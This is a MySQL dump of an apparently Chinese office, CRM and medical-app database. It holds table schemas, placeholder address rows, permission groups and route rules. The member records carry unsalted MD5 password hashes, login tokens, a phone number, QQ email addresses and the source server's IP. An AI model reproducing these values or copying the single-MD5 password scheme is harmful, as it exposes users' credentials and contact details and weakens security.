/*
Navicat MySQL Data Transfer

Source Server         : 威灵
Source Server Version : 50554
Source Host           : 43.226.146.99:3306
Source Database       : weiling

Target Server Type    : MYSQL
Target Server Version : 50554
File Encoding         : 65001

Date: 2018-11-12 11:35:43
*/

SET FOREIGN_KEY_CHECKS=0;

-- ----------------------------
-- Table structure for `xy_address`
-- ----------------------------
DROP TABLE IF EXISTS `xy_address`;
CREATE TABLE `xy_address` (
  `id` int(4) unsigned NOT NULL AUTO_INCREMENT COMMENT 'id',
  `name` varchar(32) NOT NULL COMMENT '姓名',
  `mobile` varchar(32) NOT NULL COMMENT '手机号',
  `area` varchar(32) NOT NULL COMMENT '省市区',
  `address` longtext NOT NULL COMMENT '地址',
  `uid` varchar(4) NOT NULL DEFAULT '',
  `isDefault` int(2) NOT NULL DEFAULT '0' COMMENT '1默认 0不默认',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=22 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of xy_address
-- ----------------------------
INSERT INTO `xy_address` VALUES ('1', '213', '213', '', '231', '', '0');
INSERT INTO `xy_address` VALUES ('2', 'qwe', 'weq', '', 'eqw', '', '0');
INSERT INTO `xy_address` VALUES ('3', '312', '1231', '', '231321', '', '0');
INSERT INTO `xy_address` VALUES ('4', '213', '3232', '', '2332', '', '0');
INSERT INTO `xy_address` VALUES ('8', '', '', '', '', '23', '0');
INSERT INTO `xy_address` VALUES ('9', '', '', '', '', '23', '1');
INSERT INTO `xy_address` VALUES ('10', '1', '213', '213', '213', '23', '0');
INSERT INTO `xy_address` VALUES ('21', '123', '3212', '32', '321', '29', '1');

-- ----------------------------
-- Table structure for `xy_app_member`
-- ----------------------------
DROP TABLE IF EXISTS `xy_app_member`;
CREATE TABLE `xy_app_member` (
  `id` int(4) unsigned NOT NULL AUTO_INCREMENT,
  `user_account` varchar(32) NOT NULL COMMENT '用户账号',
  `user_password` varchar(32) NOT NULL COMMENT '用户密码(一次md5加密)',
  `idcard` varchar(32) NOT NULL COMMENT '身份证',
  `real_name` varchar(32) NOT NULL COMMENT '真实姓名',
  `telephone` varchar(32) NOT NULL COMMENT '电话',
  `headimg` varchar(32) NOT NULL COMMENT '头像地址',
  `mail` varchar(32) NOT NULL COMMENT '邮箱',
  `time` varchar(32) NOT NULL COMMENT '最后操作时间',
  `sex` varchar(4) NOT NULL COMMENT '性别 0 男 1女',
  `birth` varchar(32) NOT NULL COMMENT '出生日期',
  `area` varchar(32) NOT NULL COMMENT '地区',
  `aptitude` varchar(32) NOT NULL COMMENT '资质',
  `hospital_rule` varchar(32) NOT NULL,
  `report_rule` varchar(32) NOT NULL,
  `price_rule` varchar(32) NOT NULL,
  `medicine_rule` varchar(32) NOT NULL,
  `type` varchar(2) NOT NULL DEFAULT '1' COMMENT '1( 村医 )  2( 专家)',
  `token` varchar(32) NOT NULL COMMENT '唯一标识',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=30 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of xy_app_member
-- ----------------------------
INSERT INTO `xy_app_member` VALUES ('23', '1', 'd9b1d7db4cd6e70935368a1efb10e377', '213', '', '15904040273', '/2018-10-24/5bcfff5d833d5.jpg', '', '', '0', '321', '321', '231', '', '', '', '', '1', 'c799276d1e96551e8eafceb749c19cb7');
INSERT INTO `xy_app_member` VALUES ('24', '2', '14e1b600b1fd579f47433b88e8d85291', '213', '2', '15904040273', '/2018-10-24/5bcfff85794ca.jpg', '2605995027@qq.com', '', '1', '1539187200', '321', '231', '', '', '', '', '2', '7f29ed8a3d29de11bf3e93e02448b60a');
INSERT INTO `xy_app_member` VALUES ('29', '3', '14e1b600b1fd579f47433b88e8d85291', '23', 'Wangjingjing23', '15904040273', '/2018-11-07/916651541567961.jpg', '791083150@qq.com', '1540962496', '0', '1538755200', '213', '231', '', '', '', '', '2', '9fb934242b152cc659dab3018dcee6c6');

-- ----------------------------
-- Table structure for `xy_auth_group`
-- ----------------------------
DROP TABLE IF EXISTS `xy_auth_group`;
CREATE TABLE `xy_auth_group` (
  `id` mediumint(8) NOT NULL AUTO_INCREMENT,
  `type` tinyint(1) NOT NULL,
  `title` char(50) NOT NULL,
  `level` int(2) NOT NULL,
  `pid` int(4) NOT NULL,
  `sort` int(4) NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  `rules` varchar(2000) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=24 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of xy_auth_group
-- ----------------------------
INSERT INTO `xy_auth_group` VALUES ('1', '0', '综合办公室', '0', '0', '1', '1', '2');
INSERT INTO `xy_auth_group` VALUES ('5', '1', '系统管理员', '1', '1', '1', '1', '309,310,311,312,313,314,315,316,317,318,319,320,321,322,323,324,325,326,327,328,329,330,331,332,333,334,335,336,337,338,339,340,341,342,343,344,345,346,347,348,349,350,351,352,353,354,355,356,357,358,359,360,361,362,363,364,403,365,366,402,367,368,369,370,371,372,373,374,375,376,377,404,378,379,380,381,382,383,384,385,386,387,388,389,390,391,392,393,394,395,398,396,397,405,399,401,400,406,407,408,409,410,411,412,413,414,415,416,417,418,419,420,421,422,423,424,425,426,441,427,428,429,430,431,432,436,433,434,435,437,438,439,440,442,443,444,445,446,447,451,448,449,450,452,453,454,455,456,457,458,459,460,461,462,463,464,465,466,467,468,469,472,470,471,473,474,475,476,477,478,480,479,481,482,483,484,485,486,487,488,292,294,295,296,297,298,299,300,301,302,303,304,305,306,307,308,1,2,5,3,4,6,7,8,9,10,11,12,13,14,15,16,17,58,18,19,20,21,22,23,56,24,261,262,263,264,265,266,25,26,27,28,57,29,30,31,32,33,34,35,36,247,61,60,37,38,59,39,40,41');
INSERT INTO `xy_auth_group` VALUES ('6', '1', '总经理', '1', '1', '2', '1', '309,310,311,312,313,316,317,318,319,320,321,324,325,326,327,330,331,332,333,335,336,337,338,341,342,343,344,345,346,349,350,351,352,353,354,355,356,359,360,361,362,403,365,366,402,367,368,369,370,371,372,373,376,377,404,378,379,380,381,384,385,386,387,390,391,392,393,398,396,397,405,537,399,401,406,407,408,409,412,413,414,415,416,419,420,421,422,423,426,441,427,428,429,430,436,433,434,435,437,438,439,440,442,443,444,445,451,448,449,450,452,453,454,455,456,457,458,459,462,463,464,465,466,467,472,470,471,473,474,475,476,480,479,481,482,483,484,485,488,490,532,533,535,536,491,492,493,494,495,496,497,498,499,500,501,502,503,504,505,506,507,508,509,510,511,512,513,514,515,516,295,296,297,298,299,301,302,303,304,306,307,308,5,3,4,6,7,9,10,11,12,13,15,16,17,58,18,19,21,22,23,262,263,264,36,247,61,60,38,59,40,41');
INSERT INTO `xy_auth_group` VALUES ('7', '1', '市场经理', '1', '15', '3', '1', '267,268,269,286,287,280,281,58');
INSERT INTO `xy_auth_group` VALUES ('14', '0', '财务部', '0', '0', '2', '1', '');
INSERT INTO `xy_auth_group` VALUES ('15', '0', '市场部', '0', '0', '3', '1', '309,310,311,312,313,318,319,320,321,324,325,326,327,335,336,337,338,339,340,341,342,343,344,345,346,347,348,349,350,353,354,359,360,361,362,363,364,403,365,366,402,367,368,369,370,371,372,373,374,376,377,404,378,379,380,381,384,385,386,387,390,391,392,393,394,398,397,405,537,399,401,406,407,408,409,412,413,414,415,418,490,532,533,491,492,493,494,496,498,499,500,501,502,503,504,505,506,517,518,521,522,523,526,527,528,531,292,294,295,305,306');
INSERT INTO `xy_auth_group` VALUES ('16', '0', '技术部', '0', '0', '4', '1', '309,310,311,312,313,318,319,320,321,324,325,326,327,335,336,337,338,339,340,341,342,343,344,345,346,348,349,350,351,353,354,359,360,361,362,363,364,403,365,366,402,367,368,369,413,414,415,418,292,294,295');
INSERT INTO `xy_auth_group` VALUES ('17', '1', '市场助理', '1', '15', '4', '1', '267,268,269,286,287,280,281');
INSERT INTO `xy_auth_group` VALUES ('18', '1', '技术工程师', '1', '16', '5', '1', '267,268,269,270,271,272,286,287,280,281,291,284');
INSERT INTO `xy_auth_group` VALUES ('20', '1', '会计', '1', '14', '0', '1', '309,310,311,312,313,314,316,317,318,319,321,324,325,326,327,335,336,337,338,339,340,341,342,343,344,345,346,349,350,351,352,353,354,359,360,361,362,363,364,403,365,366,402,367,368,369,390,391,399,401,419,420,421,422,423,425,426,441,463,464,465,466,467,468,469,473,474,475,476,477,478,482,483,484,485,486,487');
INSERT INTO `xy_auth_group` VALUES ('22', '1', '客服专员1', '1', '15', '6', '1', '');
INSERT INTO `xy_auth_group` VALUES ('23', '1', '客服专员2', '0', '0', '7', '1', '');

-- ----------------------------
-- Table structure for `xy_auth_group_access`
-- ----------------------------
DROP TABLE IF EXISTS `xy_auth_group_access`;
CREATE TABLE `xy_auth_group_access` (
  `uid` mediumint(8) NOT NULL,
  `group_id` mediumint(8) NOT NULL,
  KEY `uid` (`uid`),
  KEY `group_id` (`group_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of xy_auth_group_access
-- ----------------------------
INSERT INTO `xy_auth_group_access` VALUES ('1', '5');
INSERT INTO `xy_auth_group_access` VALUES ('1', '1');
INSERT INTO `xy_auth_group_access` VALUES ('15', '20');
INSERT INTO `xy_auth_group_access` VALUES ('15', '1');
INSERT INTO `xy_auth_group_access` VALUES ('8', '1');
INSERT INTO `xy_auth_group_access` VALUES ('8', '5');
INSERT INTO `xy_auth_group_access` VALUES ('14', '15');
INSERT INTO `xy_auth_group_access` VALUES ('14', '18');
INSERT INTO `xy_auth_group_access` VALUES ('13', '15');
INSERT INTO `xy_auth_group_access` VALUES ('13', '18');
INSERT INTO `xy_auth_group_access` VALUES ('12', '15');
INSERT INTO `xy_auth_group_access` VALUES ('12', '18');
INSERT INTO `xy_auth_group_access` VALUES ('11', '15');
INSERT INTO `xy_auth_group_access` VALUES ('11', '7');
INSERT INTO `xy_auth_group_access` VALUES ('10', '15');
INSERT INTO `xy_auth_group_access` VALUES ('10', '17');
INSERT INTO `xy_auth_group_access` VALUES ('9', '15');
INSERT INTO `xy_auth_group_access` VALUES ('9', '19');
INSERT INTO `xy_auth_group_access` VALUES ('16', '6');
INSERT INTO `xy_auth_group_access` VALUES ('16', '1');
INSERT INTO `xy_auth_group_access` VALUES ('17', '18');
INSERT INTO `xy_auth_group_access` VALUES ('17', '16');
INSERT INTO `xy_auth_group_access` VALUES ('18', '22');
INSERT INTO `xy_auth_group_access` VALUES ('18', '15');
INSERT INTO `xy_auth_group_access` VALUES ('19', '6');
INSERT INTO `xy_auth_group_access` VALUES ('19', '1');

-- ----------------------------
-- Table structure for `xy_auth_rule`
-- ----------------------------
DROP TABLE IF EXISTS `xy_auth_rule`;
CREATE TABLE `xy_auth_rule` (
  `id` mediumint(8) NOT NULL AUTO_INCREMENT,
  `level` int(11) NOT NULL,
  `pid` int(11) NOT NULL,
  `name` char(80) NOT NULL DEFAULT '',
  `title` char(20) NOT NULL DEFAULT '',
  `type` tinyint(1) NOT NULL DEFAULT '1',
  `status` tinyint(1) NOT NULL DEFAULT '1',
  `condition` char(100) NOT NULL DEFAULT '',
  `sort` tinyint(4) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `name` (`name`)
) ENGINE=MyISAM AUTO_INCREMENT=546 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of xy_auth_rule
-- ----------------------------
INSERT INTO `xy_auth_rule` VALUES ('1', '0', '0', 'home/system/index', '系统管理', '1', '1', '', '99');
INSERT INTO `xy_auth_rule` VALUES ('2', '1', '1', 'home/org/', '部门管理', '1', '1', '', '1');
INSERT INTO `xy_auth_rule` VALUES ('3', '2', '2', 'home/org/add', '新增', '1', '1', '', '1');
INSERT INTO `xy_auth_rule` VALUES ('4', '2', '2', 'home/org/edit', '编辑', '1', '1', '', '2');
INSERT INTO `xy_auth_rule` VALUES ('5', '2', '2', 'home/org/index', '查看', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('6', '2', '2', 'home/org/del', '删除', '1', '1', '', '3');
INSERT INTO `xy_auth_rule` VALUES ('7', '2', '2', 'home/org/editrule', '权限', '1', '1', '', '4');
INSERT INTO `xy_auth_rule` VALUES ('8', '1', '1', 'home/dep', '职位管理', '1', '1', '', '2');
INSERT INTO `xy_auth_rule` VALUES ('9', '2', '8', 'home/dep/index', '查看', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('10', '2', '8', 'home/dep/add', '新增', '1', '1', '', '1');
INSERT INTO `xy_auth_rule` VALUES ('11', '2', '8', 'home/dep/edit', '编辑', '1', '1', '', '2');
INSERT INTO `xy_auth_rule` VALUES ('12', '2', '8', 'home/dep/del', '删除', '1', '1', '', '3');
INSERT INTO `xy_auth_rule` VALUES ('13', '2', '8', 'home/dep/editrule', '权限', '1', '1', '', '4');
INSERT INTO `xy_auth_rule` VALUES ('14', '1', '1', 'home/user/', '用户管理', '1', '1', '', '3');
INSERT INTO `xy_auth_rule` VALUES ('15', '2', '14', 'home/user/index', '查看', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('16', '2', '14', 'home/user/add', '新增', '1', '1', '', '1');
INSERT INTO `xy_auth_rule` VALUES ('17', '2', '14', 'home/user/edit', '编辑', '1', '1', '', '2');
INSERT INTO `xy_auth_rule` VALUES ('18', '2', '14', 'home/user/del', '删除', '1', '1', '', '3');
INSERT INTO `xy_auth_rule` VALUES ('19', '2', '14', 'home/user/editrule', '权限', '1', '1', '', '4');
INSERT INTO `xy_auth_rule` VALUES ('20', '1', '1', 'home/config/', '数据字典', '1', '1', '', '4');
INSERT INTO `xy_auth_rule` VALUES ('21', '2', '20', 'home/config/index', '查看', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('22', '2', '20', 'home/config/add', '新增', '1', '1', '', '1');
INSERT INTO `xy_auth_rule` VALUES ('23', '2', '20', 'home/config/edit', '编辑', '1', '1', '', '2');
INSERT INTO `xy_auth_rule` VALUES ('24', '2', '20', 'home/config/del', '删除', '1', '1', '', '3');
INSERT INTO `xy_auth_rule` VALUES ('25', '1', '1', 'home/menu/', '菜单管理', '1', '1', '', '6');
INSERT INTO `xy_auth_rule` VALUES ('26', '2', '25', 'home/menu/index', '查看', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('27', '2', '25', 'home/menu/add', '新增', '1', '1', '', '1');
INSERT INTO `xy_auth_rule` VALUES ('28', '2', '25', 'home/menu/edit', '编辑', '1', '1', '', '2');
INSERT INTO `xy_auth_rule` VALUES ('29', '2', '25', 'home/menu/del', '删除', '1', '1', '', '3');
INSERT INTO `xy_auth_rule` VALUES ('30', '1', '1', 'home/rule/', '功能列表', '1', '1', '', '8');
INSERT INTO `xy_auth_rule` VALUES ('31', '2', '30', 'home/rule/index', '查看', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('32', '2', '30', 'home/rule/add', '新增', '1', '1', '', '1');
INSERT INTO `xy_auth_rule` VALUES ('33', '2', '30', 'home/rule/edit', '编辑', '1', '1', '', '2');
INSERT INTO `xy_auth_rule` VALUES ('34', '2', '30', 'home/rule/del', '删除', '1', '1', '', '3');
INSERT INTO `xy_auth_rule` VALUES ('35', '1', '1', 'home/database', '数据备份', '1', '1', '', '10');
INSERT INTO `xy_auth_rule` VALUES ('36', '2', '35', 'home/database/index', '查看', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('37', '1', '1', 'home/database/', '备份文件', '1', '1', '', '11');
INSERT INTO `xy_auth_rule` VALUES ('38', '2', '37', 'home/database/bakup', '查看', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('39', '1', '1', 'home/log', '操作日志', '1', '1', '', '15');
INSERT INTO `xy_auth_rule` VALUES ('40', '2', '39', 'home/log/index', '查看', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('41', '2', '39', 'home/log/del', '删除', '1', '1', '', '1');
INSERT INTO `xy_auth_rule` VALUES ('56', '2', '20', 'home/config/lock', '锁定', '1', '1', '', '2');
INSERT INTO `xy_auth_rule` VALUES ('57', '2', '25', 'home/menu/lock', '锁定', '1', '1', '', '2');
INSERT INTO `xy_auth_rule` VALUES ('58', '2', '14', 'home/baoming/lock', '锁定', '1', '1', '', '2');
INSERT INTO `xy_auth_rule` VALUES ('59', '2', '37', 'home/database/del', '删除', '1', '1', '', '2');
INSERT INTO `xy_auth_rule` VALUES ('60', '2', '35', 'home/database/repair', '修复', '1', '1', '', '5');
INSERT INTO `xy_auth_rule` VALUES ('61', '2', '35', 'home/database/optimize', '优化', '1', '1', '', '3');
INSERT INTO `xy_auth_rule` VALUES ('247', '2', '35', 'home/database/export', '备份', '1', '1', '', '1');
INSERT INTO `xy_auth_rule` VALUES ('261', '1', '1', 'home/datalist/index', '分类字典', '1', '1', '', '5');
INSERT INTO `xy_auth_rule` VALUES ('262', '2', '261', 'home/datalist/view', '查看', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('263', '2', '261', 'home/datalist/add', '新增', '1', '1', '', '1');
INSERT INTO `xy_auth_rule` VALUES ('264', '2', '261', 'home/datalist/edit', '编辑', '1', '1', '', '2');
INSERT INTO `xy_auth_rule` VALUES ('265', '2', '261', 'home/datalist/lock', '锁定', '1', '1', '', '3');
INSERT INTO `xy_auth_rule` VALUES ('266', '2', '261', 'home/datalist/del', '删除', '1', '1', '', '4');
INSERT INTO `xy_auth_rule` VALUES ('309', '0', '0', 'home/bangong/index', '个人办公', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('310', '1', '309', 'home/quxiang/index', '我的去向', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('311', '2', '310', 'home/quxiang/view', '查看', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('312', '2', '310', 'home/quxiang/add', '新增', '1', '1', '', '1');
INSERT INTO `xy_auth_rule` VALUES ('313', '2', '310', 'home/quxiang/edit', '编辑', '1', '1', '', '2');
INSERT INTO `xy_auth_rule` VALUES ('314', '2', '310', 'home/quxiang/lock', '锁定', '1', '1', '', '3');
INSERT INTO `xy_auth_rule` VALUES ('315', '2', '310', 'home/quxiang/del', '删除', '1', '1', '', '4');
INSERT INTO `xy_auth_rule` VALUES ('316', '1', '309', 'home/quxiangs/index', '员工去向', '1', '1', '', '2');
INSERT INTO `xy_auth_rule` VALUES ('317', '2', '316', 'home/quxiangs/view', '查看', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('318', '1', '309', 'home/renwu/index', '我的任务', '1', '1', '', '3');
INSERT INTO `xy_auth_rule` VALUES ('319', '2', '318', 'home/renwu/view', '查看', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('320', '2', '318', 'home/renwu/add', '新增', '1', '1', '', '1');
INSERT INTO `xy_auth_rule` VALUES ('321', '2', '318', 'home/renwu/edit', '编辑', '1', '1', '', '2');
INSERT INTO `xy_auth_rule` VALUES ('322', '2', '318', 'home/renwu/lock', '锁定', '1', '1', '', '3');
INSERT INTO `xy_auth_rule` VALUES ('323', '2', '318', 'home/renwu/del', '删除', '1', '1', '', '4');
INSERT INTO `xy_auth_rule` VALUES ('324', '1', '309', 'home/huibao/index', '工作汇报', '1', '1', '', '4');
INSERT INTO `xy_auth_rule` VALUES ('325', '2', '324', 'home/huibao/view', '查看', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('326', '2', '324', 'home/huibao/add', '新增', '1', '1', '', '1');
INSERT INTO `xy_auth_rule` VALUES ('327', '2', '324', 'home/huibao/edit', '编辑', '1', '1', '', '2');
INSERT INTO `xy_auth_rule` VALUES ('328', '2', '324', 'home/huibao/lock', '锁定', '1', '1', '', '3');
INSERT INTO `xy_auth_rule` VALUES ('329', '2', '324', 'home/huibao/del', '删除', '1', '1', '', '4');
INSERT INTO `xy_auth_rule` VALUES ('330', '1', '309', 'home/huibaos/index', '批注汇报', '1', '1', '', '5');
INSERT INTO `xy_auth_rule` VALUES ('331', '2', '330', 'home/huibaos/view', '查看', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('332', '2', '330', 'home/huibaos/edit', '编辑', '1', '1', '', '2');
INSERT INTO `xy_auth_rule` VALUES ('333', '2', '330', 'home/huibaos/lock', '锁定', '1', '1', '', '3');
INSERT INTO `xy_auth_rule` VALUES ('334', '2', '330', 'home/huibaos/del', '删除', '1', '1', '', '4');
INSERT INTO `xy_auth_rule` VALUES ('335', '1', '309', 'home/wendang/index', '我的文档', '1', '1', '', '6');
INSERT INTO `xy_auth_rule` VALUES ('336', '2', '335', 'home/wendang/view', '查看', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('337', '2', '335', 'home/wendang/add', '新增', '1', '1', '', '1');
INSERT INTO `xy_auth_rule` VALUES ('338', '2', '335', 'home/wendang/edit', '编辑', '1', '1', '', '2');
INSERT INTO `xy_auth_rule` VALUES ('339', '2', '335', 'home/wendang/lock', '锁定', '1', '1', '', '3');
INSERT INTO `xy_auth_rule` VALUES ('340', '2', '335', 'home/wendang/del', '删除', '1', '1', '', '4');
INSERT INTO `xy_auth_rule` VALUES ('341', '1', '309', 'home/wendangs/index', '共享文档', '1', '1', '', '7');
INSERT INTO `xy_auth_rule` VALUES ('342', '2', '341', 'home/wendangs/view', '查看', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('343', '1', '309', 'home/zhishi/index', '知识管理', '1', '1', '', '8');
INSERT INTO `xy_auth_rule` VALUES ('344', '2', '343', 'home/zhishi/view', '查看', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('345', '2', '343', 'home/zhishi/add', '新增', '1', '1', '', '1');
INSERT INTO `xy_auth_rule` VALUES ('346', '2', '343', 'home/zhishi/edit', '编辑', '1', '1', '', '2');
INSERT INTO `xy_auth_rule` VALUES ('347', '2', '343', 'home/zhishi/lock', '锁定', '1', '1', '', '3');
INSERT INTO `xy_auth_rule` VALUES ('348', '2', '343', 'home/zhishi/del', '删除', '1', '1', '', '4');
INSERT INTO `xy_auth_rule` VALUES ('349', '1', '309', 'home/msg/index', '我的消息', '1', '1', '', '9');
INSERT INTO `xy_auth_rule` VALUES ('350', '2', '349', 'home/msg/view', '查看', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('351', '2', '349', 'home/msg/lock', '锁定', '1', '1', '', '3');
INSERT INTO `xy_auth_rule` VALUES ('352', '2', '349', 'home/msg/del', '删除', '1', '1', '', '4');
INSERT INTO `xy_auth_rule` VALUES ('353', '1', '309', 'home/tongzhi/index', '通知公告', '1', '1', '', '11');
INSERT INTO `xy_auth_rule` VALUES ('354', '2', '353', 'home/tongzhi/view', '查看', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('355', '2', '353', 'home/tongzhi/add', '新增', '1', '1', '', '1');
INSERT INTO `xy_auth_rule` VALUES ('356', '2', '353', 'home/tongzhi/edit', '编辑', '1', '1', '', '2');
INSERT INTO `xy_auth_rule` VALUES ('357', '2', '353', 'home/tongzhi/lock', '锁定', '1', '1', '', '3');
INSERT INTO `xy_auth_rule` VALUES ('358', '2', '353', 'home/tongzhi/del', '删除', '1', '1', '', '4');
INSERT INTO `xy_auth_rule` VALUES ('359', '1', '309', 'home/wdtxl/index', '我的通讯录', '1', '1', '', '12');
INSERT INTO `xy_auth_rule` VALUES ('360', '2', '359', 'home/wdtxl/view', '查看', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('361', '2', '359', 'home/wdtxl/add', '新增', '1', '1', '', '1');
INSERT INTO `xy_auth_rule` VALUES ('362', '2', '359', 'home/wdtxl/edit', '编辑', '1', '1', '', '2');
INSERT INTO `xy_auth_rule` VALUES ('363', '2', '359', 'home/wdtxl/lock', '锁定', '1', '1', '', '3');
INSERT INTO `xy_auth_rule` VALUES ('364', '2', '359', 'home/wdtxl/del', '删除', '1', '1', '', '4');
INSERT INTO `xy_auth_rule` VALUES ('365', '1', '309', 'home/ggtxl/index', '公共通讯录', '1', '1', '', '13');
INSERT INTO `xy_auth_rule` VALUES ('366', '2', '365', 'home/ggtxl/view', '查看', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('367', '1', '309', 'home/dwtxl/index', '单位通讯录', '1', '1', '', '15');
INSERT INTO `xy_auth_rule` VALUES ('368', '2', '367', 'home/dwtxl/view', '查看', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('369', '0', '0', 'home/kehu/index', '客户管理', '1', '1', '', '1');
INSERT INTO `xy_auth_rule` VALUES ('370', '1', '369', 'home/cust/index', '潜在客户', '1', '1', '', '1');
INSERT INTO `xy_auth_rule` VALUES ('371', '2', '370', 'home/cust/view', '查看', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('372', '2', '370', 'home/cust/add', '新增', '1', '1', '', '1');
INSERT INTO `xy_auth_rule` VALUES ('373', '2', '370', 'home/cust/edit', '编辑', '1', '1', '', '2');
INSERT INTO `xy_auth_rule` VALUES ('374', '2', '370', 'home/cust/lock', '锁定', '1', '1', '', '3');
INSERT INTO `xy_auth_rule` VALUES ('375', '2', '370', 'home/cust/del', '删除', '1', '1', '', '4');
INSERT INTO `xy_auth_rule` VALUES ('376', '2', '370', 'home/cust/daoqi', '待跟踪', '1', '1', '', '5');
INSERT INTO `xy_auth_rule` VALUES ('377', '2', '370', 'home/cust/cheng', '成交客户', '1', '1', '', '6');
INSERT INTO `xy_auth_rule` VALUES ('378', '1', '369', 'home/custcon/index', '联系人', '1', '1', '', '2');
INSERT INTO `xy_auth_rule` VALUES ('379', '2', '378', 'home/custcon/view', '查看', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('380', '2', '378', 'home/custcon/add', '新增', '1', '1', '', '1');
INSERT INTO `xy_auth_rule` VALUES ('381', '2', '378', 'home/custcon/edit', '编辑', '1', '1', '', '2');
INSERT INTO `xy_auth_rule` VALUES ('382', '2', '378', 'home/custcon/lock', '锁定', '1', '1', '', '3');
INSERT INTO `xy_auth_rule` VALUES ('383', '2', '378', 'home/custcon/del', '删除', '1', '1', '', '4');
INSERT INTO `xy_auth_rule` VALUES ('384', '1', '369', 'home/custgd/index', '跟单记录', '1', '1', '', '3');
INSERT INTO `xy_auth_rule` VALUES ('385', '2', '384', 'home/custgd/view', '查看', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('386', '2', '384', 'home/custgd/add', '新增', '1', '1', '', '1');
INSERT INTO `xy_auth_rule` VALUES ('387', '2', '384', 'home/custgd/edit', '编辑', '1', '1', '', '2');
INSERT INTO `xy_auth_rule` VALUES ('388', '2', '384', 'home/custgd/lock', '锁定', '1', '1', '', '3');
INSERT INTO `xy_auth_rule` VALUES ('389', '2', '384', 'home/custgd/del', '删除', '1', '1', '', '4');
INSERT INTO `xy_auth_rule` VALUES ('390', '1', '369', 'home/hetong/index', '合同管理', '1', '1', '', '5');
INSERT INTO `xy_auth_rule` VALUES ('391', '2', '390', 'home/hetong/view', '查看', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('392', '2', '390', 'home/hetong/add', '新增', '1', '1', '', '1');
INSERT INTO `xy_auth_rule` VALUES ('393', '2', '390', 'home/hetong/edit', '编辑', '1', '1', '', '2');
INSERT INTO `xy_auth_rule` VALUES ('394', '2', '390', 'home/hetong/lock', '锁定', '1', '1', '', '3');
INSERT INTO `xy_auth_rule` VALUES ('395', '2', '390', 'home/hetong/del', '删除', '1', '1', '', '4');
INSERT INTO `xy_auth_rule` VALUES ('396', '2', '390', 'home/hetong/shenhe', '审核', '1', '1', '', '5');
INSERT INTO `xy_auth_rule` VALUES ('397', '2', '390', 'home/hetong/dayin', '打印', '1', '1', '', '6');
INSERT INTO `xy_auth_rule` VALUES ('398', '2', '390', 'home/hetong/dshenhe', '待审核', '1', '1', '', '4');
INSERT INTO `xy_auth_rule` VALUES ('399', '1', '369', 'home/hetongs/index', '合同明细表', '1', '1', '', '7');
INSERT INTO `xy_auth_rule` VALUES ('400', '2', '399', 'home/hetongs/del', '删除', '1', '1', '', '4');
INSERT INTO `xy_auth_rule` VALUES ('401', '2', '399', 'home/hetongs/view', '查看', '1', '1', '', '1');
INSERT INTO `xy_auth_rule` VALUES ('402', '2', '365', 'home/ggtxl/outxls', '导出', '1', '1', '', '5');
INSERT INTO `xy_auth_rule` VALUES ('403', '2', '359', 'home/wdtxl/outxls', '导出', '1', '1', '', '5');
INSERT INTO `xy_auth_rule` VALUES ('404', '2', '370', 'home/cust/outxls', '导出', '1', '1', '', '7');
INSERT INTO `xy_auth_rule` VALUES ('405', '2', '390', 'home/hetong/outxls', '导出', '1', '1', '', '8');
INSERT INTO `xy_auth_rule` VALUES ('406', '1', '369', 'home/huifang/index', '客户回访', '1', '1', '', '9');
INSERT INTO `xy_auth_rule` VALUES ('407', '2', '406', 'home/huifang/view', '查看', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('408', '2', '406', 'home/huifang/add', '新增', '1', '1', '', '1');
INSERT INTO `xy_auth_rule` VALUES ('409', '2', '406', 'home/huifang/edit', '编辑', '1', '1', '', '2');
INSERT INTO `xy_auth_rule` VALUES ('410', '2', '406', 'home/huifang/lock', '锁定', '1', '1', '', '3');
INSERT INTO `xy_auth_rule` VALUES ('411', '2', '406', 'home/huifang/del', '删除', '1', '1', '', '4');
INSERT INTO `xy_auth_rule` VALUES ('412', '2', '406', 'home/huifang/outxls', '导出', '1', '1', '', '6');
INSERT INTO `xy_auth_rule` VALUES ('413', '1', '369', 'home/tousu/index', '投诉管理', '1', '1', '', '10');
